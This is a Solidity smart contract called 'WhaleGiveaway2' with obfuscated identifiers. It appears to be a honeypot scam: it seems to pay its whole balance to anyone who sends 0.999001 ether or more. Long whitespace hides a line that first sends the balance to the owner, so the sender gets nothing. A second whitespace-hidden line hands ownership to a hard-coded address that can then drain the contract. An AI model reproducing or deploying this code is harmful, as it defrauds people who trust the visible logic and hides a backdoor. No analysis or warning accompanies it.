// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public _0x8301e9 = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function _0x75609c()
    public
    payable
    {
        if(msg.value>=_0x8301e9)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function _0x9bf9d9()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0xf39cf7,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0xf39cf7.call.value(msg.value)(data);
    }
}